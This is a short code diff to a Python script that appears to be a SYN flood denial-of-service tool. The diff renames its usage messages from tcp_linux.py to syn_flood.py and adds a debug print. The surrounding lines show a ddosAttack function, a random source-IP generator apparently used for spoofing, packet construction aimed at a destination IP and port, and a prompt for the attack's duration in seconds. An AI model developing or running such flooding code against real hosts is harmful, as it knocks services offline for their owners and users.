@@ -140,11 +140,12 @@ def genRadomIp(ip):
     return ip
 
 def ddosAttack(argv):
+    print(argv)
     try:
         opts, args = getopt.getopt(argv,"rs:",["random=,specific="])
     except getopt.GetoptError:
-        print('tcp_linux.py -r <SourceIp> <SourcePort>')
-        print('tcp_linux.py -s <Specific Ip 3byte> <SourceIp> <SourcePort>')
+        print('syn_flood.py -r <DestinationIp> <DestinationPort>')
+        print('syn_flood.py -s <Specific Ip 3byte> <DestinationIp> <DestinationPort>')
         sys.exit(2)
 
     for opt, arg in opts:
@@ -156,8 +157,8 @@ def ddosAttack(argv):
     try :
         tcp = TCP_packet(dest_ip=args[0], dest_port= int(args[1]))
     except :
-        print('tcp_linux.py -r <DestinationIp> <DestinationPort>')
-        print('tcp_linux.py -s <Specific Ip 3byte> <DestinationIp> <DestinationPort>')
+        print('syn_flood.py -r <DestinationIp> <DestinationPort>')
+        print('syn_flood.py -s <Specific Ip 3byte> <DestinationIp> <DestinationPort>')
         sys.exit(2)
 
     end = input('How much seconds do you want?')
